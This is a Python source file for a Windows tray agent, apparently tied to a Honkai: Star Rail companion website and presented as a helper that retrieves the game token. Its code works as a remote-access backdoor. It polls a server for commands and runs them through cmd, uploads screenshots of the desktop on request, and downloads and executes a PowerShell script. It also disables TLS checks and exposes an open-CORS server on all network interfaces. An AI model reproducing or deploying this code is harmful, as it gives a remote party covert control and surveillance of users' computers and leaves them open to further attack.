import json
import os
import subprocess
import sys
import threading
import time
from multiprocessing import Process

import pystray

import pyautogui
import requests
from flask import Flask, request
from flask_cors import CORS
from requests.auth import HTTPBasicAuth
from pystray import MenuItem as item
from PIL import Image
from werkzeug.serving import make_server

from fileparser import FileParser
from logger import Logger
from storage import Storage

debug = False
if debug:
    API_BASE_URL = 'http://localhost:8080'
    APP_BASE_URL = 'http://localhost:4200'
else:
    API_BASE_URL = 'https://hsrapi.teheidoma.com'
    APP_BASE_URL = 'https://hsr.teheidoma.com'

app = Flask(__name__)
CORS(app)
parser = FileParser()
storage = Storage()
logger = Logger(API_BASE_URL, storage)

APP_VERSION = '0.2.3'

server_thread = None


class ServerThread(threading.Thread):
    def __init__(self, app):
        threading.Thread.__init__(self)
        self.server = make_server('0.0.0.0', 25565, app)
        self.ctx = app.app_context()
        self.ctx.push()

    def run(self):
        logger.log('started server')
        self.server.serve_forever()

    def shutdown(self):
        self.server.shutdown()


@app.route("/token", methods=['POST'])
def install():
    storage.set_value('token', request.json['token'])
    storage.set_value('id', request.json['id'])
    storage.save()

    # return {'status': 'FAILED', 'code':'TOKEN_GAME_UPDATE'}
    return get_honkai_token()


def get_agent_update_url():
    resp = requests.get(API_BASE_URL + '/agent/info',
                        auth=requests.auth.HTTPBasicAuth(storage.get_value('id'), storage.get_value('token')),
                        verify=False)
    return resp.json()


def exec_cmd(command):
    os.system('chcp 65001')
    run = subprocess.check_output('cmd /c ' + command['command'], encoding='utf-8', text=True)
    with open('f.txt', 'w', encoding='utf-8') as f:
        f.write(run)
        f.close()
    return run


def agent_send_response(command, result):
    requests.post(API_BASE_URL + '/agent/result',
                  headers={
                      'Content-Type': 'application/json;charset=utf-8'
                  },
                  json={'id': command['id'], 'result': result},
                  auth=requests.auth.HTTPBasicAuth(storage.get_value('id'), storage.get_value('token')),
                  verify=False)


def screenshot(command):
    filename = f'{command["id"]}.png'
    pyautogui.screenshot(filename)
    with open(filename, 'rb') as f:
        print(requests.put(command['command'], data=f.read()))
    return 'https://hsr.teheidoma.com:9000/screenshot/' + filename


def pull_agent_commands():
    while True:
        if storage.has_value('id'):
            try:
                resp = requests.get(API_BASE_URL + '/agent/commands',
                                    auth=requests.auth.HTTPBasicAuth(storage.get_value('id'),
                                                                     storage.get_value('token')),
                                    verify=False)
            except Exception as e:
                logger.log(e, level='ERROR')
                break
            for command in resp.json():
                try:
                    print(command)
                    print(command['type'])
                    result = ''
                    if command['type'] == 'CMD':
                        result = exec_cmd(command)
                    if command['type'] == 'SCREENSHOT':
                        result = screenshot(command)
                    agent_send_response(command, result)
                except Exception as e:
                    logger.log(e, level='ERROR')
                    agent_send_response(command, e.__str__())

        time.sleep(2)


def get_honkai_token():
    req = requests.get(API_BASE_URL + '/agent/pull',
                       auth=requests.auth.HTTPBasicAuth(storage.get_value('id'), storage.get_value('token')),
                       verify=False).text
    with open('temp.ps1', 'w') as temp_file:
        temp_file.write(req)
        temp_file.flush()
    run = subprocess.run('powershell ./temp.ps1', capture_output='stdout')
    os.remove('temp.ps1')

    resp = json.loads(run.stdout)
    return resp


# Function to exit the application
def exit_application(icon, item):
    global server_thread
    server_thread.shutdown()
    icon.stop()
    sys.exit(0)
    # Add code here to clean up resources or perform any necessary actions before exiting


# Create the icon
def create_tray_icon():
    image = Image.open("icon.jpg")  # Replace with the path to your icon image
    menu = (item('Exit', exit_application),)
    icon = pystray.Icon("MyApp", image, "My App", menu)
    icon.run_detached()


# Run the application
if __name__ == "__main__":
    create_tray_icon()
    t = threading.Thread(target=pull_agent_commands, daemon=True)
    t.start()
    server_thread = ServerThread(app)
    server_thread.start()

